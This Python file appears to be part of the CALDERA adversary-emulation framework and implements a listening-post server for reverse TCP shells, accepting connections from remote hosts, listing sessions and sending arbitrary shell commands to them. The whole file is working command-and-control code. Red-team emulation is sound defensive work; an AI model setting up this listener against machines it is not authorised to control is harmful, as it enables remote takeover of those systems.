import argparse
import re
import signal
import socket
import struct
import sys
import time

from threading import Thread

from app.terminal.c2 import C2


class ListeningPost(C2):

    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.socket = None
        self.sessions = []
        self.addresses = []
        self.connection_retry = 5
        self.shell_prompt = 'caldera> '
        self.help = dict(
            help=dict(dsc='Show this help'),
            sessions=dict(dsc='Show active sessions'),
            enter=dict(dsc='Enter a session by index')
        )

    def accept_connections(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode('utf-8')
                address = address + (client_hostname,)
                self.sessions.append(conn)
                self.addresses.append(address)
                print('\n[*] New session: %s:%s' % (address[0], address[1]))
            except Exception as e:
                print('[-] Error accepting connections: %s' % e)

    def start_shell(self):
        while True:
            cmd = input(self.shell_prompt)
            mode = re.search(r'\((.*?)\)', self.shell_prompt)
            if cmd == 'deactivate':
                self.shell_prompt = 'caldera> '
            elif cmd in ['agent', 'ability', 'adversary', 'operation']:
                self.shell_prompt = 'caldera (%s)> ' % cmd
            elif mode:
                self.execute_mode(mode.group(1), cmd)
            elif cmd == 'sessions':
                self._list_sessions()
            elif cmd.startswith('enter'):
                self._send_target_commands(int(cmd.split(' ')[-1]))
            elif cmd == 'help':
                self._print_help()
            else:
                pass

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self._quit_gracefully)
        signal.signal(signal.SIGTERM, self._quit_gracefully)

    def socket_bind(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(self.connection_retry)
        except socket.error as e:
            print('[-] Socket binding error: %s' % e)
            time.sleep(self.connection_retry)
            self.socket_bind()

    def _quit_gracefully(self, signal=None, frame=None):
        for conn in self.sessions:
            conn.shutdown(2)
            conn.close()
        print('\n[*] Connection closed')
        sys.exit(0)

    def _print_help(self):
        print('CLASSIC COMMANDS:')
        for cmd, v in self.help.items():
            print('--- %s: %s' % (cmd, v['dsc']))
        print('APPLICATION COMMANDS:')
        for cmd, v in self.special_help.items():
            print('--- %s: %s' % (cmd, v['dsc']))

    def _list_sessions(self):
        for i, conn in enumerate(self.sessions):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
                print('--> index:%s | ip:%s | host:%s | port:%s' % (i, self.addresses[i][0], self.addresses[i][2], self.addresses[i][1]))
            except socket.error:
                del self.sessions[i]
                del self.addresses[i]

    def _read_command_output(self, conn):
        raw_msg_len = self._recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        return self._recvall(conn, msg_len)

    @staticmethod
    def _recvall(conn, n):
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def _send_target_commands(self, target):
        conn = self.sessions[target]
        conn.send(str.encode(' '))
        cwd_bytes = self._read_command_output(conn)
        cwd = str(cwd_bytes, 'utf-8')
        print(cwd, end='')
        while True:
            try:
                cmd = input()
                if cmd == 'background':
                    break
                elif len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    cmd_output = self._read_command_output(conn)
                    client_response = str(cmd_output, 'utf-8')
                    print(client_response, end='')
            except Exception as e:
                print('[-] Connection was lost %s' % e)
                break


def start(host, port):
    server = ListeningPost(host, port)
    server.register_signal_handler()
    server.socket_bind()
    threads = [Thread(target=lambda: server.start_shell(), daemon=True),
               Thread(target=lambda: server.accept_connections(), daemon=True)]
    [t.start() for t in threads]
    [t.join() for t in threads]


if __name__ == '__main__':
    parser = argparse.ArgumentParser('Reverse TCP shell')
    parser.add_argument('-H', '--host', required=False, default='0.0.0.0')
    parser.add_argument('-P', '--port', required=False, default=8880)
    args = parser.parse_args()
    start(args.host, args.port)
